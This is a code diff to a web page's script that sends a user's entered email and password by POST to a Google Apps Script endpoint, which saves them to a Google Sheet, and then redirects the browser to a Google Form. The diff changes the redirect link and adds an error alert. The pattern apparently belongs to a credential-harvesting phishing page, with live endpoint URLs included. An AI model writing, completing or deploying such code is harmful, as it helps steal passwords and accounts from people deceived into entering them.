@@ -135,18 +135,21 @@
             }
 
             // Save to Google Sheets and redirect after success
-            saveToGoogleSheet(email, password).then(() => {
-                // Redirect to Google Form after data is saved
-                window.location.href = "https://docs.google.com/forms/d/1J--LJ32VIm-GSl7I1KOB0KIRFLWv4sOMYPBZUtmvH84/edit";
-            }).catch((error) => {
-                // Handle any errors that occurred during the save
-                console.error("Error saving data:", error);
-            });
+            saveToGoogleSheet(email, password)
+                .then(() => {
+                    // Redirect to Google Form after data is saved
+                    window.location.href = "https://forms.gle/kmsJ7Zabyc1iMhsu9"; // Replace with your Google Form URL
+                })
+                .catch((error) => {
+                    // Handle any errors that occurred during the save
+                    console.error("Error saving data:", error);
+                    alert("There was an issue saving your data. Please try again.");
+                });
         }
 
         // Save Data to Google Sheets
         function saveToGoogleSheet(email, password) {
-            const scriptURL = "https://script.google.com/macros/s/AKfycbxwG7icHP31MmuTtfvyFojIJtguQ0eXtAPXvAXWi-ApBSAlErgKJnuoxuG4nj99urg/exec"; // Replace with your own script URL
+            const scriptURL = "https://script.google.com/macros/s/AKfycbxwG7icHP31MmuTtfvyFojIJtguQ0eXtAPXvAXWi-ApBSAlErgKJnuoxuG4nj99urg/exec"; // Replace with your script URL
             return fetch(scriptURL, {
                 method: "POST",
                 body: new URLSearchParams({ email, password })
